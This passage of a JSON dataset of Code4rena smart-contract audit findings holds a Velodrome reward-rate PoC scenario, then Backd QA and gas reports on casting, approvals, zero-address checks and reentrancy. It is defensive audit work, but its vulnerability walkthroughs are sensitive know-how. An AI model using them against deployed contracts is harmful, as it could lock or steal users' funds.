rewards accumulated by all the users.\n\nThis makes the users who claim the rewards later unable to retrieve their rewards as the balance can be insufficient.\n\n### PoC\n\n\n1. Alice and Bob both deposited `1,000` stake token to Gauge at `1653091200` (May 21 2022 00:00:00 GMT+0000)\n\n2. Admin called `notifyRewardAmount()` add 1,000 DAI at `1653100000` (May 21 2022 02:26:40 GMT+0000)\n\n- `bribeStart` = 1653004800 (May 20 2022 00:00:00 GMT+0000)\n- `adjustedTstamp` = 1653609600 (May 27 2022 00:00:00 GMT+0000)\n- `periodFinish[DAI]` = 1654041600 (Jun 01 2022 00:00:00 GMT+0000)\n- `lastUpdateTime[DAI]` = 1653100000\n- `rewardRate[DAI]` = 1,000 * 1e18 / 432000 = 2314814814814815\n\n3. Alice withdrawn and `getReward()` at `1654041800` Jun 01 2022 00:03:20 GMT+0000, get ~1,000 DAI\n\n- `rewardPerTokenStored[DAI]` = ~1e18\n\n4. Bob tried to `getReward()`, the transaction will revert due to insufficient balance.\n\n### Recommendation\n\nConsider calculating `rewardRate` base on timeUntilNextPeriodFinish to next period finish:\n\n```solidity\nuint nextPeriodFinish = adjustedTstamp + DURATION;\nuint timeUntilNextPeriodFinish = nextPeriodFinish - block.timestamp;\nif (block.timestamp >= periodFinish[token]) {\n    _safeTransferFrom(token, msg.sender, address(this), amount);\n    rewardRate[token] = amount / timeUntilNextPeriodFinish;\n} else {\n    uint _remaining = periodFinish[token] - block.timestamp;\n    uint _left = _remaining * rewardRate[token];\n    require(amount > _left);\n    _safeTransferFrom(token, msg.sender, address(this), amount);\n    rewardRate[token] = (amount + _left) / timeUntilNextPeriodFinish;\n}\nrequire(rewardRate[token] > 0);\nuint balance = IERC20(token).balanceOf(address(this));\nrequire(rewardRate[token] <= balance / timeUntilNextPeriodFinish, \"Provided reward too high\");\nperiodFinish[token] = nextPeriodFinish;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/186"
    }
  },
  {
    "title": "QA Report",
    "body": "**Table of Contents:**\n\n- [[L-01] Unsafe casting may overflow](#l-01-unsafe-casting-may-overflow)\n- [[L-02] Add constructor initializers](#l-02-add-constructor-initializers)\n- [[L-03] Deprecated safeApprove() function](#l-03-deprecated-safeapprove-function)\n- [[L-04] Deprecated approve() function](#l-04-deprecated-approve-function)\n- [[L-05] Lack of event emission after critical `initialize()` functions](#l-05-lack-of-event-emission-after-critical-initialize-functions)\n- [[L-06] No account existence check for low-level call](#l-06-no-account-existence-check-for-low-level-call)\n- [[L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-07-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)\n- [[N-01] Unused named returns](#n-01-unused-named-returns)\n\n## [L-01] Unsafe casting may overflow\n\nSafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting.\nConsider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:\n\n```solidity\nprotocol/contracts/tokenomics/AmmConvexGauge.sol:\n  208:         ammLastUpdated = uint48(block.timestamp);\n\nprotocol/contracts/tokenomics/AmmGauge.sol:\n   41:         ammLastUpdated = uint48(block.timestamp);\n  150:         ammLastUpdated = uint48(block.timestamp);\n\nprotocol/contracts/tokenomics/KeeperGauge.sol:\n   49:         lastUpdated = uint48(block.timestamp);\n  115:         lastUpdated = uint48(block.timestamp);\n```\n\n## [L-02] Add constructor initializers\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:\n\n- File: AddressProvider.sol\n\n```solidity\n47:     constructor(address treasury) {\n48:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, false);\n49:         _addressKeyMetas.set(AddressProviderKeys._TREASURY_KEY, meta.toUInt());\n50:         _setConfig(AddressProviderKeys._TREASURY_KEY, treasury);\n51:     }\n52: \n53:     function initialize(address roleManager) external initializer {\n54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true);\n55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt());\n56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager);\n57:     }\n```\n\n- File: LpToken.sol\n\n```solidity\n26:     constructor() ERC20Upgradeable() {}\n27: \n28:     function initialize(\n29:         string calldata name_,\n30:         string calldata symbol_,\n31:         uint8 decimals_,\n32:         address _minter\n33:     ) external override initializer returns (bool) {\n34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\n35:         __ERC20_init(name_, symbol_);\n36:         _decimals = decimals_;\n37:         minter = _minter;\n38:         return true;\n39:     }\n```\n\n- File: StakerVault.sol\n\n```solidity\n61:     constructor(IController _controller)\n62:         Authorization(_controller.addressProvider().getRoleManager())\n63:     {\n64:         controller = _controller;\n65:         IInflationManager inflationManager_ = controller.inflationManager();\n66:         require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\n67:         inflationManager = inflationManager_;\n68:         addressProvider = _controller.addressProvider();\n69:     }\n70: \n71:     function initialize(address _token) external override initializer {\n72:         token = _token;\n73:     }\n```\n\n## [L-03] Deprecated safeApprove() function\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\nAs recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:\n\n```solidity\nprotocol/contracts/CvxCrvRewardsLocker.sol:\n  57:         IERC20(CRV).safeApprove(CRV_DEPOSITOR, type(uint256).max);\n  60:         IERC20(CVX_CRV).safeApprove(CVX_CRV_STAKING, type(uint256).max);\n  63:         IERC20(CRV).safeApprove(CVX_CRV_CRV_CURVE_POOL, type(uint256).max);\n  66:         IERC20(CVX).safeApprove(CVX_LOCKER, type(uint256).max);\n\nprotocol/contracts/RewardHandler.sol:\n  52:         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);\n  64:         IERC20(token).safeApprove(spender, type(uint256).max);\n\nprotocol/contracts/tokenomics/AmmConvexGauge.sol:\n  61:         IERC20(ammToken).safeApprove(booster, type(uint256).max);\n\nprotocol/contracts/tokenomics/FeeBurner.sol:\n  118:         IERC20(token_).safeApprove(spender_, type(uint256).max);\n\nprotocol/contracts/zaps/PoolMigrationZap.sol:\n  27:             IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max);\n```\n\n## [L-04] Deprecated approve() function\n\nWhile `safeApprove()` in itself is deprecated, it is still better than `approve` which is subject to a known front-running attack and failing for certain token implementations that do not return a boolean value. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):\n\n```solidity\nFile: VestedEscrow.sol\n24:     constructor(address rewardToken_) {\n25:         IERC20(rewardToken_).approve(msg.sender, type(uint256).max);\n26:     }\n```\n\n## [L-05] Lack of event emission after critical `initialize()` functions\n\nTo record the init parameters for off-chain monitoring and transparency reasons, please consider emitting an event after the `initialize()` functions:\n\n- File: AddressProvider.sol\n\n```solidity\n53:     function initialize(address roleManager) external initializer {\n54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true);\n55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt());\n56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager);\n57:     }\n```\n\n- File: BkdLocker.sol\n\n```solidity\n53:     function initialize(\n54:         uint256 startBoost,\n55:         uint256 maxBoost,\n56:         uint256 increasePeriod,\n57:         uint256 withdrawDelay\n58:     ) external override onlyGovernance {\n59:         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);\n60:         _setConfig(_START_BOOST, startBoost);\n61:         _setConfig(_MAX_BOOST, maxBoost);\n62:         _setConfig(_INCREASE_PERIOD, increasePeriod);\n63:         _setConfig(_WITHDRAW_DELAY, withdrawDelay);\n64:     }\n```\n\n- File: LpToken.sol\n\n```solidity\n28:     function initialize(\n29:         string calldata name_,\n30:         string calldata symbol_,\n31:         uint8 decimals_,\n32:         address _minter\n33:     ) external override initializer returns (bool) {\n34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\n35:         __ERC20_init(name_, symbol_);\n36:         _decimals = decimals_;\n37:         minter = _minter;\n38:         return true;\n39:     }\n```\n\n- File: StakerVault.sol\n\n```solidity\n71:     function initialize(address _token) external override initializer {\n72:         token = _token;\n73:     }\n```\n\n## [L-06] No account existence check for low-level call\n\nLow-level calls call/delegatecall/staticcall return true even if the account called is non-existent (per EVM design). Account existence must be checked prior to calling.\n\nConsider checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future (or, at least, prevent the `address(0)` entry):\n\n```solidity\nFile: GasBank.sol\n67:     function withdrawFrom(\n68:         address account,\n69:         address payable to,\n70:         uint256 amount\n71:     ) public override {\n72:         uint256 currentBalance = _balances[account];\n73:         require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS);\n74:         require(\n75:             msg.sender == account || addressProvider.isAction(msg.sender),\n76:             Error.UNAUTHORIZED_ACCESS\n77:         );\n78: \n79:         if (msg.sender == account) {\n80:             uint256 ethRequired = controller.getTotalEthRequiredForGas(account);\n81:             require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS);\n82:         }\n83:         _withdrawFrom(account, to, amount, currentBalance);\n84:     }\n85: \n86:     function _withdrawFrom(\n87:         address account,\n88:         address payable to,\n89:         uint256 amount,\n90:         uint256 currentBalance\n91:     ) internal {\n92:         _balances[account] = currentBalance.uncheckedSub(amount);\n93: \n94:         // solhint-disable-next-line avoid-low-level-calls\n95:         (bool success, ) = to.call{value: amount}(\"\"); //@audit can be address(0)\n96:         require(success, Error.FAILED_TRANSFER);\n97: \n98:         emit Withdraw(account, to, amount);\n99:     }\n```\n\n## [L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\n\nUse `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.\n\n```solidity\nprotocol/contracts/tokenomics/InflationManager.sol:\n  627      function _getKeeperGaugeKey(address pool) internal pure returns (bytes32) {\n  628:         return keccak256(abi.encodePacked(_KEEPER_WEIGHT_KEY, pool));\n  629      }\n\n  631      function _getAmmGaugeKey(address token) internal pure returns (bytes32) {\n  632:         return keccak256(abi.encodePacked(_AMM_WEIGHT_KEY, token));\n  633      }\n\n  635      function _getLpStakerVaultKey(address vault) internal pure returns (bytes32) {\n  636:         return keccak256(abi.encodePacked(_LP_WEIGHT_KEY, vault));\n  637      }\n```\n\n## [N-01] Unused named returns\n\nWhile not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:\n\n```solidity\ntokenomics/FeeBurner.sol:47:        returns (uint256 received)\ntokenomics/FeeBurner.sol:98:        returns (uint256 received)\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/174"
    }
  },
  {
    "title": "QA Report",
    "body": "1. Title : Comment was not the same as actual code\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L112-L129\n\nIn the function of removepool(). [`Comment`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L115) was used to said that : \n\n```\n     * @return `true` if successful. \n```\n\nbut in [`actual code`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L128) was : \n\n```\n        return removed;\n```\n\nSo it can be changed as it should be. \n\n## Tool Used\n\nManual Review\n\n## Another Occurances \n\nIt happen too in this code : \n1.) AddressProvider.sol [Lines247-261](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L247-L261)\n2). LpGauge.sol [Lines.48-62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L48-L62)\n\n\n2. Title : Redundant Code `_prepare`\n\nThis code was redundant and it could be deleted for better code since it has\n\n[1](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55) and [2](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79) with the same fn()\n\n```\n    /**\n     * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay\n     */\n    function _prepare(bytes32 key, uint256 value) internal returns (bool) {\n        return _prepare(key, value, _MIN_DELAY);\n    }\n``` \n## Tool Used \nManual Review \n\n3. Title : NatSpec is incomplete\n\n1.) File : contracts/AddressProvider.sol ([Lines.77-87](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87))\n\nMissing `@return`\n\n```\n    /**\n     * @notice Adds action.\n     * @param action Address of action to add.\n     */\n    function addAction(address action) external override onlyGovernance returns (bool) {\n        bool result = _actions.add(action);\n        if (result) {\n            emit ActionListed(action);\n        }\n        return result;\n    }\n```\n\n2.) File : contracts/BkdLocker.sol ([Lines.77-83](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L77-L83))\n\nMissing `@return`\n\n```\n     /**\n     * @notice Lock gov. tokens.\n     * @dev The amount needs to be approved in advance.\n     */\n    function lock(uint256 amount) external override {\n        return lockFor(msg.sender, amount);\n    }\n```\n3.) File : contracts/Controller.sol ([Lines.78-84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L78-L84))\n\nMissing `@param amount`\n\n```\n    /**\n     * @notice Prepares the minimum amount of staked BKD required by a keeper\n     */\n    function prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {\n        require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\n        _prepare(_KEEPER_REQUIRED_STAKED_BKD, amount);\n    }\n```\n4.) File : contracts/Controller.sol ([Lines.100-108](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L100-L108))\n\nMissing `@param keeper`\n\n```\n    /**\n     * @notice Returns true if the given keeper has enough staked BKD to execute actions\n     */\n    function canKeeperExecuteAction(address keeper) external view override returns (bool) {\n        uint256 requiredBKD = getKeeperRequiredStakedBKD();\n        return\n            requiredBKD == 0 ||\n            IERC20(addressProvider.getBKDLocker()).balanceOf(keeper) >= requiredBKD;\n    }\n```\n5.) File : contracts/Controller.sol ([Lines.118-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L118-L130))\n\nMissing `@param payer`\n\n```\n     * @return the total amount of ETH require by `payer` to cover the fees for\n     * positions registered in all actions\n     */\n    function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {\n        // solhint-disable-previous-line ordering\n        uint256 totalEthRequired;\n        address[] memory actions = addressProvider.allActions();\n        uint256 numActions = actions.length;\n        for (uint256 i; i < numActions; i = i.uncheckedInc()) {\n            totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);\n        }\n        return totalEthRequired;\n    }\n```\n\n6.) File : contracts/utils/Preparable.sol ([Lines.50-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55))\n\n```\n    /**\n     * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay\n     */\n    function _prepare(bytes32 key, uint256 value) internal returns (bool) {\n        return _prepare(key, value, _MIN_DELAY);\n    }\n```\n\n7.) File :  contracts/utils/Preparable.sol ([Lines.74-79](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79))  \n\n```\n     /**\n     * @notice Same as `_prepare(bytes32,address,uint256)` but uses a default delay\n     */\n    function _prepare(bytes32 key, address value) internal returns (bool) {\n        return _prepare(key, value, _MIN_DELAY);\n    }\n```\n\n4. Title : Typo Comment \n\n1.) File : contracts/BkdLocker.sol ([Line.174](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L174))\n\n`invlude` change to `include`\n\n```\n     * @dev This does not invlude the gov. tokens queued for withdrawal.\n```\n\n2.) File : contracts/AddressProvider.sol ([Line.237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237))\n\n`feeze` change into `freeze`\n\n```\n     * @param key Key to feeze\n```\n5. Title : simplify the number of `_MAX_SUPPLY`\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12\n\n```\n  uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply\n```\n\nchanged to :\n\n```\nuint256 private constant _MAX_SUPPLY =  1e26 //100mil\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/173"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n### IERC20.approve might revert for some token\nSome token return void in approve and will revert if the IERC20 interface is used. Consider using OZ's safeApprove\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25-L26\n\n```solidity\n        IERC20(rewardToken_).approve(msg.sender, type(uint256).max);\n\n```\n\n### Hardcoded WETH address\nWETH address might change if deployed on L2\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L25-L26\n\n```solidity\n    address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH\n\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/171"
    }
  },
  {
    "title": "QA Report",
    "body": "1. Reentrancy issue in a function\nThe functions below have an external call which can allow user to reenter into the function. Although reentering the function would cause harm to the caller than good.\n\n**Occurrences in:\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L130-L134\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L108-L111\n\n---------------------------------------\n2. Missing events and emit\nCertain events and emits are necessary for core changes and admin/critical activities to allow monitoring on third party tools. The following below are missing;\n\n**Occurrences in:\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99\n\n---------------------------------\n3.. Missing zero address check\nThe following are missing checks for existence of zero address which may lead to transfers to zero address or causing some functions to no longer be accessible.\n\n**Occurrences in:\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L70\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L111\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L139\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L144\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L65\n\n\n---------------------------------------\n4.  Use of Deprecated safeApprove() function\nThe OpenZeppelin ERC20 SafeApprove() function has been deprecated, replace safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead.\n\n**Occurrences in:\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L52\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L27\n\n\n----------------------------------------\n\n5. Max approvals are risky\nMaximum approvals are widely considered as unsafe if the approved contract becomes compromised/malicious.\n\n**Occurrences in:\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118\n\n\n\n---------------------------------\n6.. Costly external calls in a loop\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L127\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44\n*https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L99\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L102\n\n\n--------------------------------------------\n\n7. Use of unsafe approve()\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L25\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/159"
    }
  },
  {
    "title": "QA Report",
    "body": "No check on address zero can cause logic errors and lost of funds \nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221\nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221\nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52\n \nAdd more comments on burnFees function and natspec comments \nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L35\n \nVery hard to read code and  its very packed together.its so compacted that my vscode visual extension cant read if its state or memory variable \nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L36-L48\n—--------------------------------------\nif (IERC20(token).allowance(address(this), spender) > 0) return;\n       IERC20(token).safeApprove(spender, type(uint256).max);\nJust space it out to make it more readable \nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63\n\nhttps://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L66\n if allowance is more then zero then  it will return nothing and first return something to  help  a function that calls this function \nif this allowance is more than zero it will return nothing and it you cant approve anything  its dead code\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/149"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## G01 - Comparison ```> 0``` is less gas efficient than ```!= 0``` with ```uint256``` in ```require``` statement with optimizer\n\n```solidity\nprotocol/contracts/BkdLocker.sol:91 require(amount > 0, Error.INVALID_AMOUNT);\nprotocol/contracts/BkdLocker.sol:92 require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); \nprotocol/contracts/BkdLocker.sol:137    require(length > 0, \"No entries\");\nprotocol/contracts/tokenomics/AmmGauge.sol:104  require(amount > 0, Error.INVALID_AMOUNT); \nprotocol/contracts/tokenomics/AmmGauge.sol:125  require(amount > 0, Error.INVALID_AMOUNT); \nprotocol/contracts/tokenomics/KeeperGauge.sol:140   require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);\nprotocol/contracts/tokenomics/VestedEscrow.sol:84   require(unallocatedSupply > 0, \"No reward tokens in contract\"); \n```\n\n## G02 - Too long revert string\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.\n\n```solidity\nprotocol/contracts/tokenomics/Minter.sol:152    \"Maximum non-inflation amount exceeded.\" \n```\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L152\n\n## G03 - ```unchecked``` block can be used for gas efficiency of the expression that can't overflow/underflow\n\nCheck comments\n```soldity \nprotocol/contracts/utils/CvxMintAmount.sol:21   uint256 currentCliff = cvxTotalSupply / _CLIFF_SIZE; // Could be unchecked since _CLIFF_SIZE is non-zero constant \nprotocol/contracts/zaps/PoolMigrationZap.sol:22 for (uint256 i; i < newPools_.length; ++i) { // Increment in for loop can be unchecked, it would never overflow with type uint256\nprotocol/contracts/tokenomics/VestedEscrow.sol:155  uint256 elapsed = _time - startTime; // Could be unchecked due to check on L152\nprotocol/contracts/BkdLocker.sol:140    i = i - 1; // Could be unchecked due to check on L139\nprotocol/contracts/BkdLocker.sol:144    stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1]; // \nCould be unchecked since length of stashedWithdraws decrease in sync with counter \"i\" and loop will end after length 1\n```\n\n## G04 - Caching storage values in memory\n\nVariables that are read multiple times in a code block can be cached and re-used instead of reading from storage to save gas.\n\n```solidity\nprotocol/contracts/StakerVault.sol:338  uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal; // token 5 SLOADs\n```\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L322-L349\n```solidity\nprotocol/contracts/StakerVault.sol:383  uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); // token 4 SLOADs\n```\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359-L398\n\n## G05 - Redundant code\n\nThe following lines don't change the value of the variable since it's uint256:\n```solidity\nprotocol/contracts/tokenomics/InflationManager.sol:575  totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0; \nprotocol/contracts/tokenomics/InflationManager.sol:589  totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0; \nprotocol/contracts/tokenomics/InflationManager.sol:602  totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;\n```\nhttps://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L575\n",
    "dataSource": {
      "name": "code-423n4/2022-05-backd-findings",
      "repo": "https://github.com/code-423n4/2022-05-backd-findings",
      "url": "https://github.com/code-423n4/2022-05-backd-findings/issues/148"
    }
  },
  {
    "title": "Gas Optimizations",
